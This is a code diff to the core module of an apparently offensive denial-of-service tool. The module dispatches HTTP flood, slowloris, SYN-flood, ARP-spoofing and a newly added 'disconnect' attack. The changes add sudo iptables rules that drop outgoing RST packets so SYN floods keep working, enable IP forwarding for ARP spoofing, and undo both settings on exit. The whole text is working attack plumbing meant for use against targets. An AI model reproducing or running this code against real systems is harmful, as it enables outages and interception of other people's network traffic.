@@ -7,12 +7,12 @@ import socket
 import sys
 from threading import Thread
 from time import sleep, time
-from typing import Callable, Dict, Iterator, List, Tuple, Union
+from typing import Dict, Iterator, List, Tuple, Union
 
 from colorama import Fore as F
 from humanfriendly import Spinner, format_timespan
 
-from tools.addons.ip_tools import get_host_ip, get_target_address, get_target_domain
+from tools.addons.ip_tools import get_host_ip, get_target_address
 from tools.addons.sockets import create_socket, create_socket_proxy
 
 
@@ -57,17 +57,13 @@ class AttackMethod:
         if self.method_name in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
             self.layer_number = 7
         elif self.method_name == "syn-flood":
-            rule = int(
-                os.popen(
-                    f"sudo iptables --check OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP > /dev/null 2>&1; echo $?"
-                ).read()[0]
+            os.system(
+                f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
             )
-            if rule:
-                os.system(
-                    f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
-                )
             self.layer_number = 4
-        elif self.method_name in ["arp-spoof"]:
+        elif self.method_name in ["arp-spoof", "disconnect"]:
+            if self.method_name == "arp-spoof":
+                os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
             self.layer_number = 2
         directory = f"tools.L{self.layer_number}.{self.method_name}"
         module = __import__(directory, fromlist=["object"])
@@ -81,7 +77,13 @@ class AttackMethod:
         return self
 
     def __exit__(self, exc_type, exc_value, traceback) -> None:
-        """Do nothing, only for context manager."""
+        """Restore system's default variables."""
+        if self.method_name == "syn-flood":
+            os.system(
+                f"sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
+            )
+        if self.method_name == "arp-spoof":
+            os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")
 
     def __run_timer(self) -> None:
         """Verify the execution time every second."""
@@ -172,17 +174,11 @@ class AttackMethod:
 
     def start(self) -> None:
         """Start the DoS attack itself."""
-        if self.layer_number == 2:
-            ip = self.target
-            port = "ARP"
-        else:
-            domain, port = get_target_domain(self.target)
-            ip = socket.gethostbyname(domain)
         duration = format_timespan(self.duration)
 
         print(
-            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target} {F.BLUE}({ip}:{port})"
-            f" using {F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n"
+            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target} {F.BLUE}"
+            f"using {F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n"
             f"[!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
         )
         if "slowloris" in self.method_name:
